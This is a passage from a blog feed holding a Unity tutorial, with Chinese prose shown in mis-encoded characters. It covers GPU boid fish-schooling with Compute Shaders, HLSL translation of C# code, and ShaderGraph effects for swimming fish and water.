´åé±¼ç¾¤çš„ç¨³å®šç»“æ„ï¼ŒåŠ å…¥æ•é£Ÿè€…ã€é£Ÿç‰©ä¹‹ç±»çš„æœºåˆ¶ä¹Ÿå¯ä»¥ä¸ºé±¼ç¾¤ç³»ç»Ÿå¢æ·»å¤æ‚æ€§ä¸è¶£å‘³æ€§ï¼Œä¸å¦¨è‡ªå·±å°è¯•ä¸€ä¸‹</p><h2 id="Compute-Shader"><a href="#Compute-Shader" class="headerlink" title="Compute Shader"></a>Compute Shader</h2><h3 id="WTF-is-this"><a href="#WTF-is-this" class="headerlink" title="WTF is this"></a>WTF is this</h3><p>ä¸å¦¨ä½¿ç”¨æ–‡æ¡£ä¸­çš„ç¤ºä¾‹æ¥è§£é‡Šä¸€ä¸‹ComputeShaderï¼Œä¸‹é¢è¿™ä¸ªComputeShaderå°†ä¸€ä¸ªæè´¨æ¶‚çº¢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#pragma kernel FillWithRed</span><br><span class="line">RWTexture2D&lt;float4&gt; res;</span><br><span class="line">[numthreads(1,1,1)]</span><br><span class="line">void FillWithRed (uint3 dtid : SV_DispatchThreadID)</span><br><span class="line">&#123;</span><br><span class="line">    res[dtid.xy] &#x3D; float4(1,0,0,1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯è§ComputeShaderä½¿ç”¨<code>HLSL</code>è¯­è¨€ï¼Œä¹Ÿå°±æ˜¯<code>High Level Shader Language</code>ï¼Œå› ä¸ºé€šå¸¸åªæ˜¯æ‹¿æ¥åšæ•°å­¦è®¡ç®—ï¼Œæ‰€ä»¥åŸºæœ¬ä¸Šåªè¦è£…ä¸€ä¸ªhlslçš„ä»£ç æç¤ºçš„extensionå°±å¯ä»¥ç›´æ¥å¼€å§‹å†™äº†</p><p><code>#pragma kernel FillWithRed</code>ï¼šé¦–å…ˆå®šä¹‰äº†ä¸€ä¸ªæ ¸å‡½æ•°ï¼Œå‡½æ•°åé»˜è®¤æ˜¯CSMainï¼Œè¿™æ˜¯compute shaderçš„å‡½æ•°å…¥å£ï¼Œä½ ä¹Ÿå¯ä»¥å®šä¹‰å¤šä¸ªå…¥å£ï¼Œå› ä¸ºæœ¬å·¥ç¨‹åªéœ€è¦ä¸€ä¸ªå…¥å£ï¼Œå¤šä¸ªå…¥å£çš„ComputeShaderæš‚æ—¶æ²¡æœ‰å¤šåšäº†è§£</p><p><code>[numthreads(1,1,1)]</code>ï¼šè§„å®šäº†ä½¿ç”¨çš„çº¿ç¨‹ç»„å¤§å°ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯å•çº¿ç¨‹ï¼Œé»˜è®¤æ˜¯<code>(8,8,1)</code>ï¼Œçº¿ç¨‹æ•°é‡ä¸º<code>8x8x1</code>ï¼Œä¹Ÿå°±æ˜¯64çº¿ç¨‹ä½œä¸ºä¸€ä¸ªçº¿ç¨‹ç»„ã€‚<a href="https://blog.csdn.net/weixin_38884324/article/details/80570160">æ›´å¤šåœ°äº†è§£numthreads</a> ä¼šå‘ç°é‡Œé¢ä¸œè¥¿æŒºå¤šï¼Œæ¶‰åŠåˆ°æ˜¾å¡çš„ç¡¬ä»¶</p><img src="/images/Boid_ThreadGroup.png" alt="Boid_ThreadGroup" style="zoom:50%;" /><p>å¦‚ä¸Šå›¾ï¼Œ<code>numthreads</code>è§„å®šäº†ä¸€ä¸ªGroup(çº¿ç¨‹ç»„)ä¸­çš„çº¿ç¨‹æ•°é‡ï¼Œ<code>Dispatch()</code>ä½œä¸ºC#è„šæœ¬è°ƒç”¨ComputeShaderçš„äº¤äº’æ–¹å¼ï¼Œä¸<code>numthread</code>æœ‰ä¸€äº›è”ç³»ï¼Œåœ¨ä»‹ç»å®ŒUnityçš„å®˜æ–¹ComputeShaderç¤ºä¾‹åä¼šæåˆ°ã€‚è‡³äºä¸ºä»€ä¹ˆå¤§å°ç”±ä¸€ä¸ªä¸‰ç»´æ•°ç»„ç¡®å®šï¼Œæ˜¯ä¸ºäº†åœ¨è®¿é—®2Dæˆ–è€…3Dçš„æ•°æ®ç»“æ„çš„æ—¶å€™æ›´åŠ æ–¹ä¾¿æ“ä½œ(å¤§æ¦‚æ˜¯å§)</p><blockquote><p>The ability to specify the size of the thread group across three dimensions allows individual threads to be accessed in a manner that logically 2D and 3D data structures</p><p align="right"><a herf="https://docs.microsoft.com/en-us/windows/win32/direct3dhlsl/sm5-attributes-numthreads">--Microsoft Doc</a></p></blockquote><p>åœ¨å®é™…ä½¿ç”¨ä¸­ï¼Œä¸€èˆ¬ä¸ä¼šä½¿<code>numthreads</code>å°äº32ï¼Œè¿™ä¼šè¾¾ä¸åˆ°æœ€ä½çº¿ç¨‹æ•°å¯¼è‡´å¤šæ ¸å›´è§‚ï¼›ä½†ä¹Ÿä¸èƒ½è¶…è¿‡1024ï¼Œåº”è¯¥ä¹Ÿæ˜¯ç¡¬ä»¶å±‚é¢çš„é™åˆ¶ã€‚æ ¹æ®ä¹‹å‰æåˆ°çš„CSDNä¸Šçš„å»ºè®®ï¼š</p><blockquote><p>AMDï¼šThreadSize ä½¿ç”¨ 64 çš„å€æ•¸ ( wavefront æ¶æ§‹ )<br>NVIDIAï¼šThreadSize ä½¿ç”¨ 32 çš„å€æ•¸ ( SIMD32 (Warp) æ¶æ§‹ )</p></blockquote><p>è¿™ä¹ˆä¸€çœ‹å®˜æ–¹åˆå§‹çº¿ç¨‹æ•°é€‰æ‹©64è¿˜æŒºåˆç†çš„ï¼Œä½†æˆ‘ä»¬ä»ç„¶éœ€è¦æ ¹æ®è‡ªå·±çš„å®é™…éœ€æ±‚ä»¥åŠé¢„æœŸçš„çº¿ç¨‹ç»„æ•°æ¥é€‰æ‹©å…·ä½“çš„<code>numthread</code></p><p><code>ID</code>ï¼šåœ¨å£°æ˜æ–¹æ³•æ—¶æåˆ°äº†<code>ID</code>çš„æ¦‚å¿µï¼Œå³<code>void FillWithRed (uint3 dtid : SV_DispatchThreadID)</code>ä¸­çš„<code>SV_DispatchThreadID</code>ï¼Œå…¶å®è¿™äº›ä¸‰ç»´çš„<code>ID</code>åŸºæœ¬ä¸Šå°±æ˜¯<code>index</code>äº†</p><blockquote><p>SV_GroupID : ç·šç¨‹çµ„ ID<br>SV_GroupThreadID : ç·šç¨‹çµ„å…§çš„ç·šç¨‹ ID (ä¸‰ç¶­ï¼Œä½ å¯ä»¥ç†è§£ç‚º Group å…§çš„åº§æ¨™)<br>SV_GroupIndex : ç·šç¨‹çµ„å…§çš„ç·šç¨‹ ID (ä¸€ç¶­)<br>SV_DispatchThreadID : å”¯ä¸€ID (ä½ å¯ä»¥ç†è§£æˆæ•´å¼µåœ–ç‰‡åº§æ¨™)</p></blockquote><img src="/images/Boid_ID.png" alt="Boid_ID" style="zoom:50%;" /><p><code>Dispatch(kernelIndex,x,y,z)</code>ï¼šç”¨äºåœ¨C#è„šæœ¬ä¸­è°ƒç”¨ComputeShaderï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ ¸å‡½æ•°çš„indexï¼Œå¦‚æœæ˜¯CSMainå°±ç›´æ¥æ˜¯0ï¼Œå¦‚æœä¸ç¡®å®šindexåˆ°åº•æ˜¯å¤šå°‘ï¼Œå¯ä»¥é€šè¿‡<code>FindeKernel(String kernelName)</code>è·å–indexã€‚å…³äºåé¢çš„xyzï¼Œéœ€è¦æ»¡è¶³<code>Dispatch*numthread&gt;=numData</code>ï¼Œå¦åˆ™æ—¢ç„¶ä½ çš„è¾“å…¥éƒ½ä¸å…¨ï¼Œæ€ä¹ˆè·å¾—ä¸€ä¸ªå®Œæ•´çš„è¾“å‡ºå‘¢ï¼Ÿ</p><p>ä¸¾å‡ ä¸ªæ —å­ï¼š</p><ul><li><p>Eg1.è¾“å‡ºComputeShaderçš„é»˜è®¤ä»£ç </p><p>  ComputeShaderåœ¨Unityä¸­åˆ›å»ºæ—¶åˆå§‹åŒ–ä»£ç å¦‚ä¸‹</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Each #kernel tells which function to compile; you can have many kernels</span><br><span class="line">#pragma kernel CSMain</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Create a RenderTexture with enableRandomWrite flag and set it</span><br><span class="line">&#x2F;&#x2F; with cs.SetTexture</span><br><span class="line">RWTexture2D&lt;float4&gt; Result;</span><br><span class="line"></span><br><span class="line">[numthreads(8,8,1)]</span><br><span class="line">void CSMain (uint3 id : SV_DispatchThreadID)</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; TODO: insert actual code here!</span><br><span class="line"></span><br><span class="line">    Result[id.xy] &#x3D; float4(id.x &amp; id.y, (id.x &amp; 15)&#x2F;15.0, (id.y &amp; 15)&#x2F;15.0, 0.0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  å¯ä»¥ä½¿ç”¨ä¸€ä¸ªC#è„šæœ¬è°ƒç”¨å®ƒ</p>  <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Tester</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> ComputeShader cs;</span><br><span class="line">    <span class="keyword">public</span> RenderTexture tex;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="comment">// åˆ›å»ºä¸€ä¸ªæè´¨æŸ¥çœ‹ç»“æœ</span></span><br><span class="line">        tex = <span class="keyword">new</span> RenderTexture(<span class="number">256</span>,<span class="number">256</span>,<span class="number">24</span>);</span><br><span class="line">        <span class="comment">// ä¸€å®šè¦è®°å¾—æ‰“å¼€å†™å…¥æƒé™</span></span><br><span class="line">        tex.enableRandomWrite = <span class="literal">true</span>;</span><br><span class="line">        tex.Create();</span><br><span class="line">        <span class="comment">// åœ¨Dispatchå‰éœ€è¦å…ˆä¼ å…¥å‚æ•°</span></span><br><span class="line">        cs.SetTexture(<span class="number">0</span>, <span class="string">&quot;Result&quot;</span>, tex);</span><br><span class="line">        <span class="comment">// æ³¨æ„åˆ°numthreadä¸º(8,8,1)ï¼Œæœ‰numthread*Dispatch=Resolution</span></span><br><span class="line">        cs.Dispatch(<span class="number">0</span>, <span class="number">256</span>/<span class="number">8</span>, <span class="number">256</span>/<span class="number">8</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  å¾—åˆ°ä¸€ä¸ªå¥½åº·çš„åˆ†å½¢å›¾æ¡ˆ</p><p>  <img src="/images/Boid_CSdefault.png"></p></li><li><p>Eg2.å°†å‚æ•°æ”¹å°</p><p>  <code>Dispatch(0,64/8,128/8,1);</code></p><p>  <code>numthread[8,8,1];</code></p><p>  <img src="/images/Boid_CSeg2.png"></p><p>  è§‚å¯Ÿåˆ°å›¾åƒä¸å…¨ä¸”åªæœ‰64x128ï¼Œä¸Dispatchä¸­ä¼ å…¥çš„é‡å»åˆ</p></li><li><p>Eg3.å°†å‚æ•°æ”¹å¤§</p><p>  <code>tex = new RenderTexture(256,300,24);</code></p><p>  <code>Dispatch(0,256/8,(int)Mathf.Ceil(300/8),1);</code></p><p>  <code>numthread[8,8,1];</code></p><p>  <img src="/images/Boid_CSeg3.png"></p><p>  æ³¨æ„åˆ°<code>(int)Mathf.Ceil(300/8) * 8 &gt; 300</code>ï¼Œå¦‚æœæ­¤å¤„ä¸ç”¨<code>Ceil</code>å‘ä¸Šå–æ•´åˆ™ä¼šå°‘ä¸€éƒ¨ä»½æ²¡æœ‰è¢«è®¡ç®—</p></li></ul><h3 id="Translation"><a href="#Translation" class="headerlink" title="Translation"></a>Translation</h3><p><code>C#</code>ç¿»è¯‘åˆ°<code>hlsl</code>çš„å·¥ä½œæµç¨‹å¦‚ä¸‹</p><p>é¦–å…ˆæ˜¯C#è„šæœ¬ä¸Š</p><ul><li><p>åˆ›å»ºç»“æ„ä½“ä¿å­˜ä¸€äº›å±æ€§ï¼Œå…¶ä¸­<code>acceleration</code>ä½œä¸ºè®¡ç®—ç»“æœï¼Œç­‰å¾…åœ¨ComputeShaderä¸­è¢«èµ‹å€¼</p>  <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">struct</span> BoidData &#123;</span><br><span class="line">    <span class="keyword">public</span> Vector3 position;</span><br><span class="line">    <span class="keyword">public</span> Vector3 forward;</span><br><span class="line">    <span class="keyword">public</span> Vector3 acceleration;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">int</span> Size &#123;</span><br><span class="line">        <span class="keyword">get</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">sizeof</span> (<span class="built_in">float</span>) * <span class="number">3</span> * <span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  å®ä¾‹åŒ–ï¼Œèµ‹å€¼ï¼Œåˆ›å»ºBuffer</p>  <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> boidData = <span class="keyword">new</span> BoidData[boids.Length];</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; boids.Length; i++) &#123;</span><br><span class="line">    boidData[i].position = boids[i].transform.position;</span><br><span class="line">    boidData[i].forward = boids[i].transform.forward;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> boidBuffer = <span class="keyword">new</span> ComputeBuffer (boids.Length, BoidData.Size);</span><br><span class="line">boidBuffer.SetData (boidData);</span><br></pre></td></tr></table></figure></li><li><p>ä¼ å…¥ComputeShaderè®¡ç®—éœ€è¦çš„å˜é‡ä¿¡æ¯</p>  <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">computeShader.SetBuffer(<span class="number">0</span>, <span class="string">&quot;boids&quot;</span>, boidBuffer);</span><br><span class="line">computeShader.SetInt(<span class="string">&quot;numBoids&quot;</span>, boids.Length);</span><br><span class="line">computeShader.SetFloat(<span class="string">&quot;viewRadius&quot;</span>, viewRadius);</span><br><span class="line">computeShader.SetFloat(<span class="string">&quot;avoidRadius&quot;</span>, avoidRadius);</span><br><span class="line">computeShader.SetFloat(<span class="string">&quot;avoidWeight&quot;</span>, avoidWeight);</span><br><span class="line">computeShader.SetFloat(<span class="string">&quot;headingWeight&quot;</span>, headingWeight);</span><br><span class="line">computeShader.SetFloat(<span class="string">&quot;centerWeight&quot;</span>, centerWeight);</span><br></pre></td></tr></table></figure></li><li><p>é€šè¿‡<code>Dispatch()</code>å¼€å§‹æ‰§è¡ŒComputeShader</p><p>  <code>computeShader.Dispatch(0, threadGroups, 1, 1);</code></p></li></ul><p>ç°åœ¨æŠŠè§†è§’åˆ‡æ¢åˆ°ComputeShaderä¸Š</p><ul><li><p>æŠŠéœ€è¦ä¼ å…¥çš„å˜é‡éƒ½å®šä¹‰ä¸€éï¼Œè¿™é‡Œæ³¨æ„ç»“æ„ä½“ä½¿ç”¨äº†<code>RWStructuredBuffer</code>ä½œä¸ºå®¹å™¨</p><blockquote><p>A structured buffer is a buffer that contains elements of equal sizes. Use a structure with one or more member types to define an element. Here is a structure with three members.</p></blockquote>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">struct Boid &#123;</span><br><span class="line">    float3 position;</span><br><span class="line">    float3 forward;</span><br><span class="line">    float3 acceleration;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">RWStructuredBuffer&lt;Boid&gt; boids;</span><br><span class="line">int numBoids;</span><br><span class="line">float viewRadius;</span><br><span class="line">float avoidRadius;</span><br><span class="line">float avoidWeight;</span><br><span class="line">float headingWeight;</span><br><span class="line">float centerWeight;</span><br></pre></td></tr></table></figure></li><li><p>ç¿»è¯‘ä¸€éC#ä»£ç ï¼Œåªéœ€è¦æ”¹ä¸€ç‚¹è¯­æ³•å°±å¯ä»¥äº†</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">void CSMain (uint3 id : SV_DispatchThreadID)</span><br><span class="line">&#123;</span><br><span class="line">    float3 zero3 &#x3D; &#123;0, 0, 0&#125;;</span><br><span class="line">    float3 avoidAcceleration &#x3D; zero3;</span><br><span class="line">    float3 headingAcceleration &#x3D; zero3;</span><br><span class="line">    float3 centerAcceleration &#x3D; zero3;</span><br><span class="line">    int mateCount;</span><br><span class="line">    int avoidCount;</span><br><span class="line">    for(int i &#x3D; 0; i &lt; numBoids; i ++)&#123;</span><br><span class="line">        if((int)id.x !&#x3D; i)&#123;</span><br><span class="line">            float3 offset &#x3D; boids[id.x].position - boids[i].position;</span><br><span class="line">            float sqrDst &#x3D; offset.x * offset.x + offset.y * offset.y + offset.z * offset.z;</span><br><span class="line">            if(sqrDst &lt; viewRadius * viewRadius)&#123;</span><br><span class="line">                mateCount +&#x3D; 1;</span><br><span class="line">                headingAcceleration +&#x3D; boids[i].forward - boids[id.x].forward;</span><br><span class="line">                centerAcceleration -&#x3D; offset;</span><br><span class="line">            &#125;</span><br><span class="line">            if(sqrDst &lt; avoidRadius * avoidRadius)&#123;</span><br><span class="line">                avoidCount++;</span><br><span class="line">                avoidAcceleration +&#x3D; normalize(offset) &#x2F; sqrDst;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    avoidAcceleration &#x3D; avoidCount &#x3D;&#x3D; 0 ? zero3 : normalize(avoidAcceleration);</span><br><span class="line">    headingAcceleration &#x3D; mateCount &#x3D;&#x3D; 0 ? zero3 : normalize(headingAcceleration);</span><br><span class="line">    centerAcceleration &#x3D; mateCount &#x3D;&#x3D; 0 ? zero3 : normalize(centerAcceleration);</span><br><span class="line">    boids[id.x].acceleration &#x3D; avoidAcceleration * avoidWeight + headingAcceleration * headingWeight + centerAcceleration * centerWeight;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>å…³äº<code>numthread</code>ï¼Œç¤ºä¾‹å·¥ç¨‹ç›´æ¥è®¾äº†<code>[1024,1,1]</code>ï¼šä½¿ç”¨ä¸€ç»´å‘é‡æ˜¯å› ä¸ºéœ€è¦å¤„ç†çš„æ•°æ®æ²¡æœ‰ç±»ä¼¼æè´¨ã€ä½“ç§¯ä¹‹ç±»çš„ä¸‰ç»´ç»“æ„ä½“ï¼›<code>1024</code>æ˜¯ä¸ºäº†ç›´æ¥æŠŠçº¿ç¨‹æ‹‰æ»¡</p><h3 id="Result-2"><a href="#Result-2" class="headerlink" title="Result"></a>Result</h3><p>å°†åŸæœ¬åœ¨CPUä¸­è¿›è¡Œçš„å¤§é‡é‡å¤è®¡ç®—è¿ç§»è‡³GPUåå¯æ¨¡æ‹Ÿçš„é±¼ç¾¤è§„æ¨¡ç¬é—´æå‡äº†ä¸å°‘ï¼Œç°åœ¨ä½ å¯ä»¥æ¨¡æ‹Ÿä¸€äº›è¾ƒå¤§è§„æ¨¡çš„é±¼ç¾¤äº†ï¼Œåœ¨æ­¤å°±ä¸é™„æ–°çš„å›¾ç‰‡äº†</p><h2 id="Polish"><a href="#Polish" class="headerlink" title="Polish"></a>Polish</h2><p>å°±ç®—ä¸ºå…¶æ¢ä¸Šä¸€ä¸ªçœŸæ­£çš„é±¼ğŸŸçš„æ¨¡å‹ï¼Œç°åœ¨çš„é±¼ç¾¤æ•´ä½“è¿˜æ¯”è¾ƒå•è°ƒï¼Œè™½ç„¶æœ‰äº†ä¸€äº›è§„åˆ™ä½¿å¾—å…¶åœ¨å®è§‚åŠ¨æ€çš„è¡¨ç°åŠ›ä¸Šæœ‰äº†é‚£ä¹ˆä¸€ææï¼Œä½†è¿˜ç¼ºå°‘ä¸€äº›æ›´åŠ ç›´è§‚çš„ç»†èŠ‚ï¼Œè¯´ç™½äº†å°±æ˜¯æœ‰ä¸€ä¸ªæœ‰è¶£çš„çµé­‚ä½†æ²¡æœ‰åä¸½çš„å¤–è¡¨ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸å¦¨åšä¸¤ä¸ªshaderæ¥ä¸ºå…¶æ¶¦è‰²ï¼Œä¸€ä¸ªshaderè´Ÿè´£é±¼çš„æ‘†åŠ¨ï¼Œå¦ä¸€ä¸ªè´Ÿè´£æ°´é¢æè´¨</p><p>æˆ‘ä½¿ç”¨çš„æ˜¯HDRPä½œä¸ºæ¸²æŸ“ç®¡çº¿ï¼Œè™½ç„¶æˆ‘ä¸ä¼šç”¨å®ƒï¼Œä½†æˆ‘å¬è¯´ä»–å¾ˆå¼ºï¼Œæ‰€ä»¥æˆ‘å¸Œæœ›èƒ½è¿ˆå‡ºç¬¬ä¸€æ­¥</p><p>ç”±äºç›®å‰ä½¿ç”¨çš„æ˜¯ShaderGraphï¼Œä¸ä¾¿äºé™„ä»£ç ï¼Œåªèƒ½è®²ä¸€ä¸‹æ€è·¯å¹¶é™„å¸¦ä¸€äº›èµ„æ–™äº†</p><h3 id="Waving-Fish"><a href="#Waving-Fish" class="headerlink" title="Waving Fish"></a>Waving Fish</h3><p>å…¶å®å¯ä»¥ç”¨ä¸€ä¸ª<code>sin(t)</code>å‡½æ•°å°±èƒ½è·å¾—å¾ˆèƒ½æ¥å—çš„æ•ˆæœäº†ï¼Œä½†æ˜¯é‰´äºé±¼éƒ½æ˜¯æˆç¾¤å‡ºç°ï¼Œä»¥æ—¶é—´ä¸ºå˜é‡çš„å‡½æ•°è‚¯å®šæ˜¯ä¸è¡Œçš„ï¼Œæˆ‘å½“å‰çš„åšæ³•æ˜¯å°†é±¼çš„ä¸–ç•Œåæ ‡ä½œä¸ºå˜é‡ï¼Œè¾“å…¥åˆ°<code>Gradient Noise</code>ï¼Œå¯¹é±¼çš„é¡¶ç‚¹åæ ‡çš„æŸä¸€ä¸ªè½´å‘åº”ç”¨è¿™ä¸ªå™ªå£°ï¼Œè¿™æ ·å¾—åˆ°çš„é±¼ä¼šæ ¹æ®è‡ªèº«ä½ç½®è€Œå†³å®šæ‘‡æ‘†ï¼Œç¼ºç‚¹æ˜¯æ²¡æœ‰å’Œé±¼çš„è½¬å‘ã€è¿åŠ¨ç­‰è”ç³»èµ·æ¥ï¼Œåœ¨è®¾æƒ³ä¸­ï¼Œèƒ½æ ¹è‡ªèº«åŠ é€Ÿåº¦é€‰æ‹©æ‘‡æ‘†æ–¹å¼çš„Shaderæ‰æ˜¯æœ€å¥½çš„ï¼Œä½†ç›®å‰ä¸æ¸…æ¥šè¿™æ ·åšçš„å¯è¡Œæ€§ä»¥åŠå…·ä½“æ–¹æ³•</p><p>æ¥ä¸‹æ¥è¿˜éœ€è¦å°†é±¼å¤´çš„æ‘‡æ‘†å¹…åº¦é™ä½ï¼Œå› ä¸ºä¸€èˆ¬æ¥è¯´é±¼å¤´ä¸ä¼šåƒå°¾å·´å’Œèº«ä½“é‚£æ ·å‰§çƒˆæ‘†åŠ¨ã€‚åœ¨æ­¤æ¨èäº†è§£ä¸€ä¸‹æœ‰å…³<code>UV</code>çš„æ¦‚å¿µï¼Œè¿™å¾ˆé‡è¦ï¼Œæ¯”å¦‚æ­¤å¤„å¯ä»¥å°†UVçš„xä½œä¸ºå˜é‡ï¼Œåœ¨å™ªå£°å’ŒåŸæœ¬çš„é¡¶ç‚¹ä½ç½®ä¹‹é—´åšçº¿æ€§æ’å€¼(LERP)ï¼Œä¹Ÿå¯ä»¥å¯¹UV.xå–å¹³æ–¹ä¹‹ç±»çš„ä»¥è®©æ‘†åŠ¨çš„è¿‡åº¦æ›´åŠ è‡ªç„¶</p><p>ç»¼ä¸Šï¼Œä¾¿å¾—åˆ°äº†ä¸€æ¡æ¬¢å¿«çš„å°é±¼ğŸŸ</p><p><img src="/images/Boid_WavingFish.gif"></p><h3 id="Water-Surface-Shader"><a href="#Water-Surface-Shader" class="headerlink" title="Water Surface Shader"></a>Water Surface Shader</h3><p>é±¼å¾—åˆ°äº†å‡çº§ï¼Œè¿˜éœ€è¦ä¸€ä¸ªå®¹å™¨æ¥ä½¿å¾—æ•´ä¸ªåœºæ™¯åœ¨æ°´ä¸­ï¼Œè¿™é‡Œé€‰æ‹©åˆ¶ä½œä¸€ä¸ªæ°´é¢çš„æè´¨è´´åœ¨å¹³é¢ä¸Šï¼Œåšæˆå¼€å¤´é‚£æ ·çš„æ°´ç«‹æ–¹ï¼ŒUnityå®˜æ–¹æä¾›äº† <a href="https://www.youtube.com/watch?v=gRq-IdShxpU">åŸºæœ¬çš„æ°´é¢ShdaerGraphæ•™ç¨‹</a>ï¼Œç”±äºå¤„å¤„ç¢°å£ï¼Œæˆ‘ä¹Ÿå°±åŸºæœ¬æ˜¯æŠ„äº†ä¸€éå®˜æ–¹çš„æˆæœ</p><p>ä¸»è¦çš„æ€æƒ³æ˜¯ä½¿<code>Scene Depth</code>ä¸<code>Screen Position</code>ç›¸å‡ï¼Œç”±äºå‰è€…çš„æ£€æµ‹ä¸åŒ…å«é€æ˜ç‰©ä½“ï¼Œè€Œåè€…åŒ…å«ï¼Œåˆ™å¯ä»¥è·å–ç©¿è¿‡ä¸€ä¸ªé€æ˜å¹³é¢åçš„ç©ºé—´æ·±åº¦ä¿¡æ¯</p><img src="/images/Boid_Depth.png" alt="Boid_Depth" style="zoom: 67%;" /><p>ä¹‹ååªéœ€è¦åœ¨è¿™ä¸ªå¹³é¢çš„è¡¨é¢åšä¸¤å±‚ä¸åŒç»†èŠ‚ç¨‹åº¦çš„æ°´é¢Normal Mapçš„åå‘æ»šåŠ¨ï¼Œå†åŠ å…¥ç”±å™ªå£°æ§åˆ¶çš„å¹³é¢é¡¶ç‚¹åæ ‡çš„èµ·ä¼å³å¯</p><h2 id="Final-Result"><a href="#Final-Result" class="headerlink" title="Final Result"></a>Final Result</h2><p>Check the final result if you want, a gif about 10 Mb</p><p><img src="/images/Boid_Final.gif"></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Unity </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello Dimension</title>
      <link href="2021/04/24/HelloDimension/"/>
      <url>2021/04/24/HelloDimension/</url>
      
